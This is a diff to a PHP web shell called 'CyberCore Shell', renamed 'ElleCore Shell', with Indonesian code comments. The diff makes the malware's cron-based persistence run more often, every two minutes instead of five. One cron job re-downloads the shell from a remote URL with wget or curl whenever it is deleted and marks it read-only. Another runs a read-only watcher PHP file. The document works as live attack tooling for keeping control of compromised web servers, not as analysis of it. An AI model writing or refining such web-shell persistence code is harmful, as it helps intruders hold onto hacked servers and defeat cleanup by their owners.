@@ -442,7 +442,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 $safe_file_path = custom_escapeshellarg($full_file_path);
                 $safe_shell_url = custom_escapeshellarg($shell_url);
                 $wget_or_curl = (try_execute_command('command -v wget') ? "wget -qO" : "curl -sLo");
-                $cron_command = "*/5 * * * * if [ ! -f {$safe_file_path} ]; then {$wget_or_curl} {$safe_file_path} {$safe_shell_url}; chmod 0444 {$safe_file_path}; fi #CRON_PERSISTENCE";
+                $cron_command = "*/2 * * * * if [ ! -f {$safe_file_path} ]; then {$wget_or_curl} {$safe_file_path} {$safe_shell_url}; chmod 0444 {$safe_file_path}; fi #CRON_PERSISTENCE";
                 
                 // 4. Tambahkan perintah ke crontab
                 $current_crontab = try_execute_command('crontab -l');
@@ -496,7 +496,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             if (@file_put_contents($watcher_filepath, $watcher_code)) {
                 @chmod($watcher_filepath, 0444);
                 
-                $new_cron_line = "*/5 * * * * " . escapeshellarg($php_binary) . " " . escapeshellarg($watcher_filepath);
+                $new_cron_line = "*/2 * * * * " . escapeshellarg($php_binary) . " " . escapeshellarg($watcher_filepath);
                 
                 $current_crontab = @shell_exec('crontab -l');
                 if (strpos($current_crontab, $new_cron_line) === false) {
@@ -1318,7 +1318,7 @@ ob_start();
         <aside class="sidebar w-64 flex-shrink-0 glass-effect h-full fixed left-0 top-0 overflow-y-auto cyber-border p-4">
             <div class="flex items-center mb-6">
                 <i class="fas fa-ghost text-accent text-2xl mr-2 cyber-glow" style="color:var(--accent);"></i>
-                <h1 class="text-xl font-bold cyber-font">CyberCore<span class="cyber-glow">Shell</span></h1>
+                <h1 class="text-xl font-bold cyber-font">ElleCore<span class="cyber-glow">Shell</span></h1>
             </div>
             
             <h3 class="text-xs uppercase tracking-wider text-gray-400 mb-2 px-2 cyber-font">Main Tools</h3>
